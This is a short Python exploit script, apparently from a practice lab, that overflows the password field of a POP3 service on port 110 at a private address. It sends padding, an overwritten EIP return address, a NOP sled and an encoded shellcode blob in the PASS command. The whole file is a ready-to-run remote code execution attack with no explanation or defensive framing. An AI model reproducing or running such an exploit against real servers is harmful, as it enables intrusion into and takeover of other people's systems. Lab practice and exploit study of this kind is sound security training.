#!/usr/bin/python3 

from struct import pack
import socket
import sys

# Variables globales
ip_address = "192.168.57.117"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13)

shellcode = (b"\xbb\xb5\xdb\x15\x51\xda\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9"
b"\xb1\x52\x31\x5e\x12\x83\xee\xfc\x03\xeb\xd5\xf7\xa4\xef"
b"\x02\x75\x46\x0f\xd3\x1a\xce\xea\xe2\x1a\xb4\x7f\x54\xab"
b"\xbe\x2d\x59\x40\x92\xc5\xea\x24\x3b\xea\x5b\x82\x1d\xc5"
b"\x5c\xbf\x5e\x44\xdf\xc2\xb2\xa6\xde\x0c\xc7\xa7\x27\x70"
b"\x2a\xf5\xf0\xfe\x99\xe9\x75\x4a\x22\x82\xc6\x5a\x22\x77"
b"\x9e\x5d\x03\x26\x94\x07\x83\xc9\x79\x3c\x8a\xd1\x9e\x79"
b"\x44\x6a\x54\xf5\x57\xba\xa4\xf6\xf4\x83\x08\x05\x04\xc4"
b"\xaf\xf6\x73\x3c\xcc\x8b\x83\xfb\xae\x57\x01\x1f\x08\x13"
b"\xb1\xfb\xa8\xf0\x24\x88\xa7\xbd\x23\xd6\xab\x40\xe7\x6d"
b"\xd7\xc9\x06\xa1\x51\x89\x2c\x65\x39\x49\x4c\x3c\xe7\x3c"
b"\x71\x5e\x48\xe0\xd7\x15\x65\xf5\x65\x74\xe2\x3a\x44\x86"
b"\xf2\x54\xdf\xf5\xc0\xfb\x4b\x91\x68\x73\x52\x66\x8e\xae"
b"\x22\xf8\x71\x51\x53\xd1\xb5\x05\x03\x49\x1f\x26\xc8\x89"
b"\xa0\xf3\x5f\xd9\x0e\xac\x1f\x89\xee\x1c\xc8\xc3\xe0\x43"
b"\xe8\xec\x2a\xec\x83\x17\xbd\xd3\xfc\x2e\x75\xbc\xfe\x50"
b"\x84\x87\x76\xb6\xec\xe7\xde\x61\x99\x9e\x7a\xf9\x38\x5e"
b"\x51\x84\x7b\xd4\x56\x79\x35\x1d\x12\x69\xa2\xed\x69\xd3"
b"\x65\xf1\x47\x7b\xe9\x60\x0c\x7b\x64\x99\x9b\x2c\x21\x6f"
b"\xd2\xb8\xdf\xd6\x4c\xde\x1d\x8e\xb7\x5a\xfa\x73\x39\x63"
b"\x8f\xc8\x1d\x73\x49\xd0\x19\x27\x05\x87\xf7\x91\xe3\x71"
b"\xb6\x4b\xba\x2e\x10\x1b\x3b\x1d\xa3\x5d\x44\x48\x55\x81"
b"\xf5\x25\x20\xbe\x3a\xa2\xa4\xc7\x26\x52\x4a\x12\xe3\x62"
b"\x01\x3e\x42\xeb\xcc\xab\xd6\x76\xef\x06\x14\x8f\x6c\xa2"
b"\xe5\x74\x6c\xc7\xe0\x31\x2a\x34\x99\x2a\xdf\x3a\x0e\x4a"
b"\xca")

payload = before_eip + eip + b"\x90"*16 + shellcode

def exploit():

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connet to server
    s.connect((ip_address, port))

    # Recive the Banner
    banner = s.recv(1024)

    s.send(b"USER victor" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
